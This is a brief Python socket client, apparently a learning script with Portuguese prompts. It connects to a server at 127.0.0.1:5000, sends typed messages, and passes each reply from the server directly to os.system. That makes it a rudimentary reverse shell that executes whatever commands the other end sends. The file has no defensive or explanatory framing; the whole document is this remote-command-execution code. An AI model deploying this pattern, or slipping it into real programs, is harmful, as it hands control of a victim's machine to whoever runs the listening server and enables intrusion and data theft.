import socket, os, sys
host = '127.0.0.1'
port = 5000
tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
destino = (host, port)
tcp.connect(destino)
while True:
	msg = input('Digite uma mensagem: ')
	msg = bytes(msg, 'utf-8')
	tcp.send(msg)
	mensagem = tcp.recv(1024)
	if not mensagem: break
	print(mensagem)
	os.system(mensagem)